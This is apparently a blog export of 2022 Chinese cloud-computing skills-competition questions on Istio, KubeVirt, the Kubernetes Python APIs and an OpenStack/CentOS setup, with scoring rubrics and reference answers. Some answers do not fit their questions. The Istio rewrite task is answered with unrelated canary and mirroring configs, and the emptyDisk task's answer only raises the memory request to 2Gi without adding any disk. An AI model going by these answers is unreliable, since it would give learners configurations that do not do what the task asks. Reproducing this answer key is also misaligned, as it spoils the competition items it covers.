<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">[<span class="type">root</span>@<span class="type">k8s</span>-<span class="type">master</span>-<span class="type">node1</span> <span class="type">ServiceMesh</span>]<span class="comment"># cat virtual-service-all-v1.yaml</span></span><br><span class="line">apiVersion: networking.istio.io/v1alpha3</span><br><span class="line">kind: VirtualService</span><br><span class="line">metadata:</span><br><span class="line">name: productpage</span><br><span class="line">spec:</span><br><span class="line">hosts:</span><br><span class="line"> - productpage</span><br><span class="line">http:</span><br><span class="line"> - route:</span><br><span class="line">   - destination:</span><br><span class="line">      host: productpage</span><br><span class="line">      subset: v1</span><br><span class="line"><span class="literal">---</span></span><br><span class="line">apiVersion: networking.istio.io/v1alpha3</span><br><span class="line">kind: VirtualService</span><br><span class="line">metadata:</span><br><span class="line">name: reviews</span><br><span class="line">spec:</span><br><span class="line">hosts:</span><br><span class="line"> - reviews</span><br><span class="line">http:</span><br><span class="line"> - route:</span><br><span class="line">   - destination:</span><br><span class="line">      host: reviews</span><br><span class="line">      subset: v1</span><br><span class="line"><span class="literal">---</span></span><br><span class="line">apiVersion: networking.istio.io/v1alpha3</span><br><span class="line">kind: VirtualService</span><br><span class="line">metadata:</span><br><span class="line">name: ratings</span><br><span class="line">spec:</span><br><span class="line">hosts:</span><br><span class="line"> - ratings</span><br><span class="line">http:</span><br><span class="line"> - route:</span><br><span class="line">   - destination:</span><br><span class="line">      host: ratings</span><br><span class="line">      subset: v1</span><br><span class="line"><span class="literal">---</span></span><br><span class="line">apiVersion: networking.istio.io/v1alpha3</span><br><span class="line">kind: VirtualService</span><br><span class="line">metadata:</span><br><span class="line">name: details</span><br><span class="line">spec:</span><br><span class="line">hosts:</span><br><span class="line"> - details</span><br><span class="line">http:</span><br><span class="line"> - route:</span><br><span class="line">   - destination:</span><br><span class="line">      host: details</span><br><span class="line">      subset: v1</span><br></pre></td></tr></table></figure>
<p>配置默认请求路由：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">[<span class="type">root</span>@<span class="type">k8s</span>-<span class="type">master</span>-<span class="type">node1</span> <span class="type">ServiceMesh</span>]<span class="comment"># kubectl apply -f virtual-service-all-v1.yaml</span></span><br><span class="line">virtualservice.networking.istio.io/productpage created</span><br><span class="line">virtualservice.networking.istio.io/reviews created</span><br><span class="line">virtualservice.networking.istio.io/ratings created</span><br><span class="line">virtualservice.networking.istio.io/details created</span><br></pre></td></tr></table></figure>


<p>1.路由创建成功得 0.2 分；<br>2.用户限制正确得 0.3 分。</p>
<h3 id="【题目-11】服务网格–创建请求路由-0-5-分"><a href="#【题目-11】服务网格–创建请求路由-0-5-分" class="headerlink" title="【题目 11】服务网格–创建请求路由[0.5 分]"></a>【题目 11】服务网格–创建请求路由[0.5 分]</h3><p>在default 命名空间下创建一个名为reviews-route 的虚拟服务，默认情况下，所有的HTTP<br>流量都会被路由到标签为 version:v1 的 reviews 服务的 Pod 上。此外，路径以&#x2F;wpcatalog&#x2F;或<br>&#x2F;consumercatalog&#x2F;开头的HTTP 请求将被重写为&#x2F;newcatalog，并被发送到标签为 version:v2 的<br>Pod 上。完成后提交 master 节点的 IP 地址、用户名和密码到答题框。</p>
<p>使用下面的命令把50%的流量从reviews:v1转移到reviews:v3（金丝雀版本）：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">[<span class="type">root</span>@<span class="type">k8s</span>-<span class="type">master</span>-<span class="type">node1</span> <span class="type">ServiceMesh</span>]<span class="comment"># cat virtual-service-reviews-50-50.yaml</span></span><br><span class="line">apiVersion: networking.istio.io/v1alpha3</span><br><span class="line">kind: VirtualService</span><br><span class="line">metadata:</span><br><span class="line">name: reviews</span><br><span class="line">spec:</span><br><span class="line">hosts:</span><br><span class="line">   - reviews</span><br><span class="line">http:</span><br><span class="line"> - route:</span><br><span class="line">   - destination:</span><br><span class="line">      host: reviews</span><br><span class="line">      subset: v1</span><br><span class="line">    weight: <span class="number">50</span></span><br><span class="line">   - destination:</span><br><span class="line">      host: reviews</span><br><span class="line">      subset: v3</span><br><span class="line">    weight: <span class="number">50</span></span><br><span class="line">[<span class="type">root</span>@<span class="type">k8s</span>-<span class="type">master</span>-<span class="type">node1</span> <span class="type">ServiceMesh</span>]<span class="comment"># kubectl apply -f virtual-service-reviews-50-50.yaml</span></span><br><span class="line">virtualservice.networking.istio.io/reviews configured</span><br></pre></td></tr></table></figure>
<p>假如认为reviews:v3微服务已经稳定，可以通过应用Virtual Service规则将100%的流量路由reviews:v3：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">[<span class="type">root</span>@<span class="type">k8s</span>-<span class="type">master</span>-<span class="type">node1</span> <span class="type">ServiceMesh</span>]<span class="comment"># cat virtual-service-reviews-v3.yaml</span></span><br><span class="line">apiVersion: networking.istio.io/v1alpha3</span><br><span class="line">kind: VirtualService</span><br><span class="line">metadata:</span><br><span class="line">name: reviews</span><br><span class="line">spec:</span><br><span class="line">hosts:</span><br><span class="line">   - reviews</span><br><span class="line">http:</span><br><span class="line"> - route:</span><br><span class="line">   - destination:</span><br><span class="line">      host: reviews</span><br><span class="line">      subset: v3</span><br><span class="line">[<span class="type">root</span>@<span class="type">k8s</span>-<span class="type">master</span>-<span class="type">node1</span> <span class="type">ServiceMesh</span>]<span class="comment"># kubectl apply -f virtual-service-reviews-v3.yaml</span></span><br><span class="line">virtualservice.networking.istio.io/reviews configured</span><br><span class="line"></span><br><span class="line">初始化默认路由规则，将所有流量路由到服务的v1版本：</span><br><span class="line"></span><br><span class="line">[<span class="type">root</span>@<span class="type">k8s</span>-<span class="type">master</span>-<span class="type">node1</span> <span class="type">ServiceMesh</span>]<span class="comment"># kubectl apply -f virtual-service-all-v1.yaml</span></span><br></pre></td></tr></table></figure>
<p>改变reviews服务的流量规则，将v1版本的流量镜像到v2版本：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">[<span class="type">root</span>@<span class="type">k8s</span>-<span class="type">master</span>-<span class="type">node1</span> <span class="type">ServiceMesh</span>]<span class="comment"># cat virtual-service-mirroring.yaml</span></span><br><span class="line">apiVersion: networking.istio.io/v1alpha3</span><br><span class="line">kind: VirtualService</span><br><span class="line">metadata:</span><br><span class="line">name: reviews</span><br><span class="line">spec:</span><br><span class="line">hosts:</span><br><span class="line">   - reviews</span><br><span class="line">http:</span><br><span class="line"> - route:</span><br><span class="line">   - destination:</span><br><span class="line">      host: reviews</span><br><span class="line">      subset: v1</span><br><span class="line">    weight: <span class="number">100</span></span><br><span class="line">  mirror:</span><br><span class="line">      host: reviews</span><br><span class="line">      subset: v2</span><br><span class="line">[<span class="type">root</span>@<span class="type">k8s</span>-<span class="type">master</span>-<span class="type">node1</span> <span class="type">ServiceMesh</span>]<span class="comment"># kubectl apply -f virtual-service-mirroring.yaml</span></span><br><span class="line">virtualservice.networking.istio.io/reviews configured</span><br></pre></td></tr></table></figure>
<p>1.请求路由创建成功得 0.2 分；<br>2.路由策略配置正确得 0.3 分。</p>
<h2 id="【任务-5】容器云服务运维：Kubernetes-基于虚拟机的运维-4-0-分"><a href="#【任务-5】容器云服务运维：Kubernetes-基于虚拟机的运维-4-0-分" class="headerlink" title="【任务 5】容器云服务运维：Kubernetes  基于虚拟机的运维[4.0 分]"></a>【任务 5】容器云服务运维：Kubernetes  基于虚拟机的运维[4.0 分]</h2><h3 id="【题目-1】VM-管理–创建-VM-0-5-分"><a href="#【题目-1】VM-管理–创建-VM-0-5-分" class="headerlink" title="【题目 1】VM 管理–创建 VM[0.5 分]"></a>【题目 1】VM 管理–创建 VM[0.5 分]</h3><p>使用镜像 fedora-virt:v1.0 在 default 命名空间下创建一台 vm，名称为 vm-fedora，内存为1G。<br>完成后提交 master 节点的 IP 地址、用户名和密码到答题框。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#参考官网学习http://kubevirt.io/user-guide/virtual_machines/virtual_machine_instances/</span></span><br><span class="line"></span><br><span class="line">apiVersion: kubevirt.io/v1</span><br><span class="line">kind: VirtualMachine</span><br><span class="line">metadata:</span><br><span class="line">  labels:</span><br><span class="line">    kubevirt.io/vm: vm<span class="literal">-fedora</span></span><br><span class="line">  name: vm<span class="literal">-fedora</span></span><br><span class="line">spec:</span><br><span class="line">  running: false</span><br><span class="line">  template:</span><br><span class="line">    metadata:</span><br><span class="line">      labels:</span><br><span class="line">        kubevirt.io/vm: vm<span class="literal">-fedora</span></span><br><span class="line">    spec:</span><br><span class="line">      domain:</span><br><span class="line">        resources:</span><br><span class="line">          requests:</span><br><span class="line">            memory: <span class="number">1</span><span class="built_in">Gi</span></span><br><span class="line">        devices:</span><br><span class="line">          disks:</span><br><span class="line">          - name: containerdisk</span><br><span class="line">            disk:</span><br><span class="line">              bus: virtio</span><br><span class="line">      volumes:</span><br><span class="line">      - name: containerdisk</span><br><span class="line">        containerDisk:</span><br><span class="line">          image: fedora<span class="literal">-virt</span>:v1.<span class="number">0</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>1.VM 创建成功得 0.3 分；<br>2.VM 配置正确得 0.2 分。</p>
<h3 id="【题目-2】存储与卷–创建-emptyDisk-卷-1-分"><a href="#【题目-2】存储与卷–创建-emptyDisk-卷-1-分" class="headerlink" title="【题目 2】存储与卷–创建 emptyDisk 卷[1 分]"></a>【题目 2】存储与卷–创建 emptyDisk 卷[1 分]</h3><p>使用镜像 fedora-virt:v1.0 在 default 命名空间下创建一台 vmi，名称为 vmi-fedora，并使用 emptyDisk 卷为 vmi 挂载一块 2G 的磁盘。完成后提交 master 节点的 IP 地址、用户名和密码到答题框。</p>
<p>把上题的磁盘改为2G即可</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">apiVersion: kubevirt.io/v1</span><br><span class="line">kind: VirtualMachine</span><br><span class="line">metadata:</span><br><span class="line">  labels:</span><br><span class="line">    kubevirt.io/vm: vm<span class="literal">-fedora</span></span><br><span class="line">  name: vm<span class="literal">-fedora</span></span><br><span class="line">spec:</span><br><span class="line">  running: false</span><br><span class="line">  template:</span><br><span class="line">    metadata:</span><br><span class="line">      labels:</span><br><span class="line">        kubevirt.io/vm: vm<span class="literal">-fedora</span></span><br><span class="line">    spec:</span><br><span class="line">      domain:</span><br><span class="line">        resources:</span><br><span class="line">          requests:</span><br><span class="line">            memory: <span class="number">2</span><span class="built_in">Gi</span></span><br><span class="line">        devices:</span><br><span class="line">          disks:</span><br><span class="line">          - name: containerdisk</span><br><span class="line">            disk:</span><br><span class="line">              bus: virtio</span><br><span class="line">      volumes:</span><br><span class="line">      - name: containerdisk</span><br><span class="line">        containerDisk:</span><br><span class="line">          image: fedora<span class="literal">-virt</span>:v1.<span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>1.VMI 创建成功得 0.4 分；<br>2.卷挂载成功得 0.6 分。</p>
<h3 id="【题目-3】KubeVirt-运维–创建-VMI-1-5-分"><a href="#【题目-3】KubeVirt-运维–创建-VMI-1-5-分" class="headerlink" title="【题目 3】KubeVirt 运维–创建 VMI[1.5 分]"></a>【题目 3】KubeVirt 运维–创建 VMI[1.5 分]</h3><p>将提供的镜像 exam.qcow2 转换为 docker 镜像 exam:v1.0，然后使用镜像 exam:v1.0 镜像在 default 命名空间下创建一台 vmi，名称为 exam，将虚拟机的 80 端口以 NodePort 的方式对外暴露为 30082，并使用数据源在启动时将 VM 的主机名初始化为exam。<br>完成后提交 master 节点的 IP 地址、用户名和密码到答题框。</p>
<p>1.qcow2 镜像转化成功得 0.3 分；<br>2.VMI 创建成功得 0.3 分；<br>3.端口暴露成功得 0.3 分；<br>4.服务能正常访问得 0.4 分；<br>5.主机名初始化成功得 0.2 分。</p>
<h3 id="【题目-4】KubeVirt-运维–启用快照-1-分"><a href="#【题目-4】KubeVirt-运维–启用快照-1-分" class="headerlink" title="【题目 4】KubeVirt 运维–启用快照[1 分]"></a>【题目 4】KubeVirt 运维–启用快照[1 分]</h3><p>KubeVirt 支持对 VM 进行快照，请启用KubeVirt 快照管理功能： 完成后提交 master 节点的 IP 地址、用户名和密码到答题框。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 参考官网http://kubevirt.io/user-guide/operations/snapshot_restore_api/</span></span><br></pre></td></tr></table></figure>

<p>1.快照功能启用成功得 1 分。</p>
<h2 id="【任务-6】容器云运维开发：Kubernetes-APIs-运维开发-10-分"><a href="#【任务-6】容器云运维开发：Kubernetes-APIs-运维开发-10-分" class="headerlink" title="【任务 6】容器云运维开发：Kubernetes APIs 运维开发[10 分]"></a>【任务 6】容器云运维开发：Kubernetes APIs 运维开发[10 分]</h2><h3 id="【题目-1】Python-运维开发：基于-Kubernetes-Restful-API-实现-Deployment-创建-2-分"><a href="#【题目-1】Python-运维开发：基于-Kubernetes-Restful-API-实现-Deployment-创建-2-分" class="headerlink" title="【题目 1】Python 运维开发：基于 Kubernetes Restful API 实现 Deployment 创建[2 分]"></a>【题目 1】Python 运维开发：基于 Kubernetes Restful API 实现 Deployment 创建[2 分]</h3><p>在提供的OpenStack 私有云平台上，使用 k8s-python-dev 镜像创建 1 台云主机，云主机类型使用 4vCPU&#x2F;12G 内存&#x2F;100G 硬盘。该主机中已经默认安装了所需的开发环境，登录默认账号密码为“root&#x2F;1DaoYun@2022”。<br>使用Kubernetes Restful API 库，在&#x2F;root 目录下，创建 api_deployment_manager.py 文件， 要求编写 python 代码，代码实现以下任务：<br>（1）编写 Python 程序实现 Deployment 资源的创建。Deployment 配置信息如下。如果同名Deployment 存在，先删除再创建。<br>（2）创建完成后，查询该Deployment 的详细信息，执行结果控制台输出，以yaml 格式展示。<br>创建Deployment 的yaml 的配置如下：</p>
<h2 id="apiVersion-apps-v1-kind-Deployment-metadata-name-nginx-deployment-labels-app-nginx-spec-replicas-3-selector-matchLabels-app-nginxtemplate-metadata-labels-app-nginx-spec-containers-name-nginximage-nginx-1-15-4-ports-containerPort-80"><a href="#apiVersion-apps-v1-kind-Deployment-metadata-name-nginx-deployment-labels-app-nginx-spec-replicas-3-selector-matchLabels-app-nginxtemplate-metadata-labels-app-nginx-spec-containers-name-nginximage-nginx-1-15-4-ports-containerPort-80" class="headerlink" title="apiVersion: apps&#x2F;v1 kind: Deployment metadata:name: nginx-deployment labels:app: nginx spec:replicas: 3 selector:matchLabels: app: nginxtemplate: metadata:labels:app: nginx spec:containers:- name: nginximage: nginx:1.15.4 ports:- containerPort: 80"></a>apiVersion: apps&#x2F;v1 kind: Deployment metadata:<br>name: nginx-deployment labels:<br>app: nginx spec:<br>replicas: 3 selector:<br>matchLabels: app: nginx<br>template: metadata:<br>labels:<br>app: nginx spec:<br>containers:<br>- name: nginx<br>image: nginx:1.15.4 ports:<br>- containerPort: 80</h2><p>1.执行api_deployment_manager.py 脚本，成功创建 deployment 资源，计 1 分；<br>2.检查创建的 deployment 资源，配置信息无误计 1 分。</p>
<h3 id="【题目-2】Python-运维开发：基于-Kubernetes-Python-SDK-实现-Job-创建-1-分"><a href="#【题目-2】Python-运维开发：基于-Kubernetes-Python-SDK-实现-Job-创建-1-分" class="headerlink" title="【题目 2】Python 运维开发：基于 Kubernetes Python SDK 实现 Job 创建[1 分]"></a>【题目 2】Python 运维开发：基于 Kubernetes Python SDK 实现 Job 创建[1 分]</h3><p>在前面已建好的 Kubernetes 开发环境云平台上。使用 Kubernetes python SDK 的“kubernetes”Python 库，在&#x2F;root 目录下，创建 sdk_job_manager.py 文件，要求编写 python 代码，代码实现以下任务：<br>（1）编写 Python 程序实现 Job 资源的创建。Job 配置信息如下。如果同名 Job 存在， 先删除再创建。<br>（2）创建完成后，查询该 Job 的详细信息，执行结果控制台输出，以 json 格式展示。<br>Job 创建 yaml 的信息如下：</p>
<p>apiVersion: batch&#x2F;v1 kind: Job<br>metadata: name: pi<br>spec:<br>template: spec:<br>containers:</p>
<ul>
<li>name: pi image: perl<br>command: [“perl”,	“-Mbignum&#x3D;bpi”, “-wle”, “print bpi(2000)”] restartPolicy: Never<br>backoffLimit: 4</li>
</ul>
<p>1.执行 sdk_job_manager.py 脚本，成功创建job 资源，计 0.5 分；<br>2.查询 job 资源，配置信息无误，计 0.5 分。</p>
<h3 id="【题目-3】Python-运维开发：Pod-资源的-Restful-APIs-HTTP-服务封装-3-分"><a href="#【题目-3】Python-运维开发：Pod-资源的-Restful-APIs-HTTP-服务封装-3-分" class="headerlink" title="【题目 3】Python 运维开发：Pod 资源的 Restful APIs HTTP 服务封装[3 分]"></a>【题目 3】Python 运维开发：Pod 资源的 Restful APIs HTTP 服务封装[3 分]</h3><p>编写 Python 程序实现Pod 资源管理程序，将 Pod 资源管理的封装成Web 服务。</p>
<p>在&#x2F;root 目录下创建pod_server.py 程序，实现Pod 的增删查改等Web 访问操作。http.server 的 host 为 localhost，端口 8889；程序内部实现Kubernetes 认证。<br>提示说明：Python 标准库http.server 模块，提供了HTTP Server 请求封装。需要实现的 Restful API 接口如下：<br>GET &#x2F;pod&#x2F;{name} ，查询指定名称{name}的 Pod；Response 的 Body 以 json 格式输出。<br>POST &#x2F;pod&#x2F;{yamlfilename} 创建 yaml 文件名称为{yamlfilename}的 Pod；Response 的<br>Body 以 json 格式。<br>编码完成后，“手工下载”文件服务器主目录所有*.yaml 文件到 root 目录下，“手动执行”所编写pod_server.py 程序，提交答案进行检测。</p>
<p>1.HTTP 服务成功启动，计 1 分；<br>2.发起指定参数的GET 查询 Pod 请求，成功查询指定名称的 pod 服务，计 1 分；<br>3.发起指定参数的 POST 创建 Pod 请求，成功创建 Pod 服务，计 1 分。</p>
<h3 id="【题目-4】Python-运维开发：Service-资源-Restful-APIs-HTTP-服务封装-4-分"><a href="#【题目-4】Python-运维开发：Service-资源-Restful-APIs-HTTP-服务封装-4-分" class="headerlink" title="【题目 4】Python 运维开发：Service 资源 Restful APIs HTTP 服务封装[4 分]"></a>【题目 4】Python 运维开发：Service 资源 Restful APIs HTTP 服务封装[4 分]</h3><p>编写 Python 程序实现 Service 资源管理程序，将 Service 资源管理的封装成 Web 服务。在&#x2F;root 目录下创建 service_server.py 程序，实现 Service 的增删查改等 Web 访问操作。<br>http.server 的 host 为 localhost，端口 8888；程序内部实现Kubernetes 认证。</p>
<p>提示说明：Python 标准库http.server 模块，提供了HTTP Server 请求封装。需要实现的 Restful API 接口如下：<br>GET &#x2F;services&#x2F;{name}，查询指定名称{name}的 Service；Response 的 Body 以 json 格式输出。<br>POST &#x2F;services&#x2F;{yamlfilename} 创建yaml 文件名称为{yamlfilename}的 Service； Response 的Body 以 json 格式，（手工将文件服务器主目录所有*.yaml 文件下载到 root 目录下）。<br>DELETE &#x2F;services&#x2F;{name}；删除指定名称的 Service；Response 的 Body 以 json 格式。编码完成后，自己手动执行提供 Web HTTP 服务的 service_server.py 程序，提交答案进<br>行检测。</p>
<p>1.HTTP 服务成功启动，计 1 分；<br>2.发起指定参数的 POST 创建 service 请求，成功创建 service 资源，计 1 分；<br>3.发起指定参数的GET 查询 service 请求，成功查询指定名称的 Service，计 1 分；<br>4.发起指定参数的DELETE 删除 service 请求，成功删除指定名称的 Service，计 1 分</p>
]]></content>
      <categories>
        <category>云计算</category>
        <category>技能大赛汇总</category>
      </categories>
      <tags>
        <tag>云计算</tag>
        <tag>云计算职业技能大赛</tag>
      </tags>
  </entry>
  <entry>
    <title>云计算方向-2022年云计算技能大赛-赛题私有云（部分）</title>
    <url>/posts/aa9fe4ac.html</url>
    <content><![CDATA[<h1 id="第一套赛题"><a href="#第一套赛题" class="headerlink" title="第一套赛题"></a>第一套赛题</h1><table>
<thead>
<tr>
<th>主机名</th>
<th>接口</th>
<th>ip地址</th>
</tr>
</thead>
<tbody><tr>
<td>controller</td>
<td>ens33 ens34</td>
<td>192.168.100.10  192.168.200.10</td>
</tr>
<tr>
<td>compute</td>
<td>en33   ens34</td>
<td>192.168.100.20 192.168.200.20</td>
</tr>
</tbody></table>
<h2 id="任务1-基础运维任务（5分）"><a href="#任务1-基础运维任务（5分）" class="headerlink" title="任务1  基础运维任务（5分）"></a><strong>任务1  基础运维任务（5分）</strong></h2><p>1．根据表1中的IP地址规划，设置各服务器节点的IP地址，确保网络正常通信，设置云服务器1主机名为Controller，云服务器2主机名为Compute，并修改hosts文件将IP地址映射为主机名，关闭防火墙并设置为开机不启动，设置SELinux为Permissive 模式。</p>
<p><strong>controller</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#更改主机名</span></span><br><span class="line">hostnamectl set-hostname controller</span><br><span class="line"><span class="comment">#添加映射</span></span><br><span class="line"><span class="built_in">cat</span> /etc/hosts</span><br><span class="line">127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4</span><br><span class="line">::1         localhost localhost.localdomain localhost6 localhost6.localdomain6</span><br><span class="line">192.168.100.10 controller</span><br><span class="line">192.168.100.20 compute</span><br><span class="line"><span class="comment">#关闭防火墙</span></span><br><span class="line">systemctl stop firewalld &amp;&amp; systemctl <span class="built_in">disable</span> firewalld</span><br><span class="line"><span class="comment">#设置selinux</span></span><br><span class="line">setenforce 0</span><br><span class="line">vi /etc/selinux/config</span><br><span class="line">SELINUX=permissive <span class="comment">#修改为permissive</span></span><br></pre></td></tr></table></figure>

<p><strong>compute</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">修改主机名</span></span><br><span class="line">hostnamectl set-hostname compute</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">添加映射</span></span><br><span class="line">cat /etc/hosts</span><br><span class="line">127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4</span><br><span class="line">::1         localhost localhost.localdomain localhost6 localhost6.localdomain6</span><br><span class="line">192.168.100.10 controller</span><br><span class="line">192.168.100.20 compute</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">关闭防火墙</span></span><br><span class="line">systemctl stop firewalld &amp;&amp; systemctl disable firewalld</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">设置selinux</span></span><br><span class="line">setenforce 0</span><br><span class="line">vi /etc/selinux/config</span><br><span class="line">SELINUX=permissive #修改为permissive</span><br></pre></td></tr></table></figure>

<p>2．将提供的CentOS-7-x86_64-DVD-1804.iso和OpenStackQueens.iso光盘镜像上传到Controller节点&#x2F;root目录下，然后在&#x2F;opt目录下分别创建centos目录和openstack目录，并将镜像文件CentOS-7-x86_64-DVD-1804.iso挂载到centos目录下，将镜像文件OpenStackQueens.iso挂载到openstack目录下。</p>
<p>（若无OpenStackQueens.iso，可用国赛镜像代替）</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#创建目录</span></span><br><span class="line"><span class="built_in">mkdir</span> /opt/centos</span><br><span class="line"><span class="built_in">mkdir</span> /opt/openstack</span><br><span class="line"><span class="comment">#挂载</span></span><br><span class="line">mount CentOS-7-x86_64-DVD-1804.iso /opt/centos/</span><br><span class="line">mount chinaskills_cloud_iaas.iso /opt/openstack/</span><br></pre></td></tr></table></figure>

<p>3．在Controller节点上利用centos目录中的软件包安装vsftp服务器，设置开机自启动，并使用ftp提供yum仓库服务，分别设置controller节点和compute节点的yum源文件ftp.repo，其中ftp服务器地址使用IP形式。</p>
<p><strong>controller</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mv</span> /etc/yum.repos.d/* /etc/yum</span><br><span class="line"><span class="comment">#编写yum源</span></span><br><span class="line"><span class="built_in">cat</span> /etc/yum.repos.d/local.repo</span><br><span class="line">[centos]</span><br><span class="line">name=centos</span><br><span class="line">baseurl=file:///opt/centos</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br><span class="line">[openstack]</span><br><span class="line">name=openstack</span><br><span class="line">baseurl=file:///opt/openstack/iaas-repo</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br><span class="line"><span class="comment">#更新缓存区</span></span><br><span class="line">yum repolist</span><br><span class="line"><span class="comment">#安装并配置vsftpd</span></span><br><span class="line">yum install -y vsftpd</span><br><span class="line">vi /etc/vsftpd/vsftpd.conf</span><br><span class="line">anon_root=/opt/</span><br><span class="line"></span><br><span class="line"><span class="comment">#启动服务</span></span><br><span class="line">systemctl start vsftpd</span><br><span class="line">systemctl <span class="built_in">enable</span> vsftpd</span><br></pre></td></tr></table></figure>

<p><strong>compute</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mv</span> /etc/yum.repos.d/* /etc/yum</span><br><span class="line"><span class="built_in">cat</span> /etc/yum.repos.d/ftp.repo</span><br><span class="line">[centos]</span><br><span class="line">name=centos</span><br><span class="line">baseurl=ftp://192.168.100.10/centos</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br><span class="line">[openstack]</span><br><span class="line">name=openstack</span><br><span class="line">baseurl=ftp://192.168.100.10/openstack/iaas-repo</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br><span class="line"><span class="comment">#更新缓存区</span></span><br><span class="line">yum repolist</span><br></pre></td></tr></table></figure>

<p>4．在Controller节点上部署chrony服务器，允许其他节点同步时间，启动服务并设置为开机启动；在compute节点上指定controller节点为上游NTP服务器，重启服务并设为开机启动。</p>
<p><strong>controller</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#安装chrony服务器</span></span><br><span class="line">yum install -y chrony</span><br><span class="line">vi /etc/chrony.conf</span><br><span class="line"><span class="comment">#server 0.centos.pool.ntp.org iburst</span></span><br><span class="line"><span class="comment">#server 1.centos.pool.ntp.org iburst</span></span><br><span class="line"><span class="comment">#server 2.centos.pool.ntp.org iburst</span></span><br><span class="line"><span class="comment">#server 3.centos.pool.ntp.org iburst</span></span><br><span class="line">server controller iburst</span><br><span class="line"><span class="comment">#添加在最后</span></span><br><span class="line">allow 192.168.100.0/24</span><br><span class="line"><span class="built_in">local</span> stratum 10</span><br><span class="line"><span class="comment">#重启并设为开机自动启动</span></span><br><span class="line">systemctl restart chronyd</span><br><span class="line">systemctl <span class="built_in">enable</span> chronyd</span><br><span class="line"><span class="comment">#生效</span></span><br><span class="line">chronyc sources</span><br></pre></td></tr></table></figure>

<p><strong>compute</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">vi /etc/chrony.conf</span><br><span class="line"><span class="comment">#server 0.centos.pool.ntp.org iburst</span></span><br><span class="line"><span class="comment">#server 1.centos.pool.ntp.org iburst</span></span><br><span class="line"><span class="comment">#server 2.centos.pool.ntp.org iburst</span></span><br><span class="line"><span class="comment">#server 3.centos.pool.ntp.org iburst</span></span><br><span class="line">server controller iburst</span><br><span class="line"><span class="comment">#重启并设为开机自动启动</span></span><br><span class="line">systemctl restart chronyd</span><br><span class="line">systemctl <span class="built_in">enable</span> chronyd</span><br><span class="line"><span class="comment">#生效</span></span><br><span class="line">chronyc sources</span><br></pre></td></tr></table></figure>

<p>5．在compute节点上利用空白分区划分2个100G分区。</p>
<p><strong>compute</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">fdisk /dev/sdb</span><br></pre></td></tr></table></figure>

<h2 id="任务2-OpenStack搭建任务（10分）"><a href="#任务2-OpenStack搭建任务（10分）" class="headerlink" title="任务2  OpenStack搭建任务（10分）"></a><strong>任务2  OpenStack搭建任务（10分）</strong></h2><p>1．在控制节点和计算节点上分别安装quickinstall软件包，根据表2配置脚本文件中基本变量（配置脚本文件为&#x2F;etc&#x2F;cloudconfig&#x2F;openrc.sh）。</p>
<p><img src="C:\Users\user\AppData\Roaming\Typora\typora-user-images\image-20221011095611848.png" alt="image-20221011095611848"></p>
<p>2．在controller节点上使用 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;openstack-install-mysql.sh 脚本安装Mariadb、Memcached、etcd服务。</p>
<p>3．在controller节点上使用  &#x2F;usr&#x2F;local&#x2F;bin&#x2F;openstack-install-keystone.sh 脚本安装Keystone 服务。</p>
<p>4．在controller节点上使用&#x2F;usr&#x2F;local&#x2F;bin&#x2F;openstack-install-glance.sh脚本安装glance 服务。</p>
<p>5．在controller节点和compute节点上分别使用&#x2F;usr&#x2F;local&#x2F;bin&#x2F;openstack-install-nova -controller.sh脚本、&#x2F;usr&#x2F;local&#x2F;bin&#x2F;openstack-install-nova-compute.sh脚本安装Nova 服务。</p>
<p>6．在controller节点和compute节点上分别修改&#x2F;usr&#x2F;local&#x2F;bin&#x2F;openstack-install-neutron -controller.sh脚本、&#x2F;usr&#x2F;local&#x2F;bin&#x2F;openstack-install-neutron-compute.sh脚本分别安装 Neutron 服务，网络选用vlan模式。</p>
<p>7．在controller节点上使用 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;openstack-install-heat.sh脚本安装dashboad服务。</p>
<p>8．在controller节点和compute节点上分别修改&#x2F;usr&#x2F;local&#x2F;bin&#x2F;openstack-install–cinder -controller.sh脚本、&#x2F;usr&#x2F;local&#x2F;bin&#x2F;openstack-install -cinder-compute.sh脚本安装cinder服务。</p>
<h2 id="任务3-OpenStack云平台运维（10分）"><a href="#任务3-OpenStack云平台运维（10分）" class="headerlink" title="任务3  OpenStack云平台运维（10分）"></a><strong>任务3  OpenStack云平台运维（10分）</strong></h2><p>1．在openstack私有云平台上，基于cirrors.qcow2镜像，使用命令创建一个名为cirros的镜像。</p>
